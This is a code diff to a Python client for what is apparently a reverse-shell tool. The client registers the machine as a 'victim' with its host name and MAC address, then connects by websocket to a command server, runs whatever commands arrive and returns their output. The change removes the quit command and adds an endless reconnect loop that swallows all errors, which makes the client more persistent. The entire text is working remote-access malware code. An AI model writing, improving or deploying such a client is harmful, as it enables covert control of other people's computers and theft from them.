@@ -33,10 +33,8 @@ class Client(object):
             response, self.session_id = self.api.login()
             self.api.create_victim(self.host_name, self.mac_address)
 
-    def execute_command(self, command):
-        if command == 'quit':
-            print("quitting...")
-            self.client.close()
+    @staticmethod
+    def execute_command(command):
         if command[:2] == 'cd':
             os.chdir(command[3:])
         if len(command) > 0:
@@ -48,17 +46,22 @@ class Client(object):
         return output_str
 
     def main(self):
-        ws = websocket.create_connection("ws://localhost:8000/ws/reverse_shell/connect/",
-                                         cookie=f'sessionid={self.session_id}')
         while True:
-            data = ws.recv()
-            json_data = json.loads(data)
-            command = json_data['message']
-            output = self.execute_command(command)
-            ws.send(json.dumps({'message': output}))
+            try:
+                self.connect_to_web_server()
+                ws = websocket.create_connection("ws://localhost:8000/ws/reverse_shell/connect/",
+                                                 cookie=f'sessionid={self.session_id}')
+                while True:
+                    data = ws.recv()
+                    json_data = json.loads(data)
+                    command = json_data['message']
+                    output = self.execute_command(command)
+                    ws.send(json.dumps({'message': output}))
+            except:
+                ws.close()
+                self.api.logout()
 
 
 if __name__ == '__main__':
     client = Client()
-    client.connect_to_web_server()
     client.main()
